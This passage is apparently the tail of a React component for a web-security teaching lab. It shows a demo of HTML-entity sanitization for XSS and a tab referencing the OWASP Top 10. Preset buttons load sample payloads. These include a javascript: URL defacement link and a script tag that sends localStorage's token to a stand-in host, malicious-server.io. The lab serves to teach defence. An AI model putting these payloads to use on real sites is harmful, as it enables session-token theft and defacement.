                          <span className="text-[8px] bg-red-500/10 text-red-400 font-bold px-1 rounded">COOKIE LEAK</span>
                        </button>
                        <button 
                          type="button" 
                          onClick={() => setXssInput('<a href="javascript:alert(\'Defaced!\')">Click for coupon prizes!</a>')}
                          className="bg-[#05070a] hover:bg-[#131b2b] p-1.5 rounded text-[10px] font-mono text-amber-300 text-left border border-[#1e293b] flex items-center justify-between"
                        >
                          <span>Javascript URL scheme Link</span>
                          <span className="text-[8px] bg-red-500/10 text-red-400 font-bold px-1 rounded">DEFACEMENT</span>
                        </button>
                        <button 
                          type="button" 
                          onClick={() => setXssInput('<script>fetch("http://malicious-server.io/log?k=" + localStorage.getItem("token"))</script>')}
                          className="bg-[#05070a] hover:bg-[#131b2b] p-1.5 rounded text-[10px] font-mono text-amber-300 text-left border border-[#1e293b] flex items-center justify-between"
                        >
                          <span>Script tag infiltration</span>
                          <span className="text-[8px] bg-red-500/10 text-red-400 font-bold px-1 rounded">TOKEN EXFIL</span>
                        </button>
                      </div>
                    </div>

                    <button 
                      type="submit"
                      className="w-full bg-[#131b2b] hover:text-amber-400 text-white border border-amber-500/20 py-2 rounded text-xs font-mono font-bold flex items-center justify-center gap-1.5 transition-all"
                    >
                      <Terminal className="w-3.5 h-3.5 text-amber-500" /> Apply Server Sanitizer filter
                    </button>
                  </form>
                </div>

                {/* DIAGNOSTIC ESCAPING VISUALIZER (7 cols) */}
                <div className="lg:col-span-7 bg-[#0a0f18] border border-[#1e293b] rounded p-5 space-y-4">
                  <span className="font-mono text-xs text-[#94a3b8] font-bold uppercase tracking-wider block border-b border-[#1e293b] pb-2">
                    🛡️ DOM Tree Escaping & Sandbox Visualization
                  </span>

                  {xssResult ? (
                    <div className="space-y-4 font-mono text-xs">
                      
                      {/* ORIGINAL UNSAFE DISPLAY (safely string-rendered of course!) */}
                      <div className="space-y-1">
                        <span className="text-[10px] text-amber-400 font-bold uppercase tracking-wider block">Raw Entered Code String</span>
                        <div className="bg-[#05070a] p-2.5 border border-[#1e293b] rounded text-gray-400 leading-normal break-all">
                          {xssResult.original}
                        </div>
                      </div>

                      {/* SANITIZED DISPLAY */}
                      <div className="space-y-1">
                        <span className="text-[10px] text-emerald-400 font-bold uppercase tracking-wider block">Sanitized HTML-Entity String (Sent safely to database)</span>
                        <div className="bg-[#05070a] p-2.5 border border-[#1e293b] rounded text-emerald-400 font-bold leading-normal break-all select-all">
                          {xssResult.sanitized}
                        </div>
                        <span className="text-[9px] text-[#475569] block italic">
                          Character symbols like &lt; and &gt; are converted into safe entities (&amp;lt; and &amp;gt;) before browser evaluation.
                        </span>
                      </div>

                      {/* VISUAL LAYOUT SIMULATION SCREEN */}
                      <div className="p-3 bg-[#0f172a] border border-[#1e293b] rounded space-y-2">
                        <span className="text-[10px] text-cyan-400 font-bold uppercase tracking-wider block">Simulated Browser Render Sandbox</span>
                        
                        <div className="grid grid-cols-2 gap-3 pt-1">
                          {/* RAW UNSAFE PORTRAYAL */}
                          <div className="border border-red-500/20 p-2.5 rounded bg-[#05070a] space-y-1">
                            <span className="text-[8px] font-bold text-red-400 block uppercase font-mono">⚠️ Vulnerable execution</span>
                            <div className="text-[11px] text-red-300 leading-normal">
                              {/* We warn but of course React prevents default script tags, but we simulates user-facing impact */}
                              <div className="p-2 bg-red-950/20 border border-red-500/20 rounded text-[10px]">
                                [POPUP ALERT EXECUTION TRIGGERED]
                              </div>
                            </div>
                          </div>

                          {/* RAW SECURE PORTRAYAL */}
                          <div className="border border-emerald-500/25 p-2.5 rounded bg-[#05070a] space-y-1">
                            <span className="text-[8px] font-bold text-emerald-400 block uppercase font-mono">🛡️ Protected display</span>
                            <div className="text-[11px] text-gray-300 leading-normal break-all p-2 bg-emerald-950/15 border border-emerald-500/15 rounded text-[10px]">
                              {xssResult.sanitized}
                            </div>
                          </div>
                        </div>
                      </div>

                      <div className="p-3 bg-[#131b2b] border border-[#1e293b] rounded text-xs text-gray-400 font-sans leading-relaxed">
                        <strong>🛡️ Defense Insight:</strong> When printing values to browser context, frameworks like <strong>React</strong> automatically evaluate strings securely, escaping elements inside curly braces <code>{"{}"}</code>. However, when parsing rich CMS text widgets using properties like <code>dangerouslySetInnerHTML</code> or using legacy template engines, server-side entity sanitization remains critical.
                      </div>

                    </div>
                  ) : (
                    <div className="text-center py-20 text-gray-500 border border-dashed border-[#1e293b] rounded font-mono text-xs">
                      Enter HTML payloads and click the sanitize button to observe escaping.
                    </div>
                  )}
                </div>

              </div>
            </div>
          )}

          {/* ACTIVE TAB: OWASP TOP 10 DETAILED REFERENCE */}
          {activeTab === 'owasp-ref' && (
            <div className="animate-fade-in">
              <OwaspTop10Reference />
            </div>
          )}

          {/* SECURE DATA ENCRYPTION ENGINE STATUS FOOTER BAR */}
          <div className="bg-[#0a0f18] border border-[#1e293b] p-4 rounded">
            <span className="block text-[11px] text-[#94a3b8] font-mono font-bold uppercase tracking-wider mb-2">
              Secure Data Storage - Cryptographic Entropy Protection engine
            </span>
            <div className="flex gap-1.5 h-2">
              <div className="h-full flex-1 bg-emerald-500 rounded-sm shadow-[0_0_5px_rgba(16,185,129,0.3)]"></div>
              <div className="h-full flex-1 bg-emerald-500 rounded-sm shadow-[0_0_5px_rgba(16,185,129,0.3)]"></div>
              <div className="h-full flex-1 bg-emerald-500 rounded-sm shadow-[0_0_5px_rgba(16,185,129,0.3)]"></div>
              <div className="h-full flex-1 bg-emerald-500 rounded-sm shadow-[0_0_5px_rgba(16,185,129,0.3)]"></div>
              <div className="h-full flex-1 bg-emerald-500 rounded-sm shadow-[0_0_5px_rgba(16,185,129,0.3)]"></div>
              <div className="h-full flex-1 bg-emerald-500 rounded-sm shadow-[0_0_5px_rgba(16,185,129,0.3)]"></div>
              <div className="h-full flex-1 bg-[rgba(30,41,59,0.6)] rounded-sm"></div>
              <div className="h-full flex-1 bg-[rgba(30,41,59,0.6)] rounded-sm"></div>
            </div>
            <div className="flex justify-between items-center text-[10px] text-[#475569] font-mono mt-2 uppercase tracking-wide">
              <span>AES-256-GCM SALTED ENTROPY ACTIVE</span>
              <span className="text-emerald-400">75% SYMMETRIC ROTATION COMPLETE</span>
            </div>
          </div>

        </div>
      </main>

    </div>
  );
}
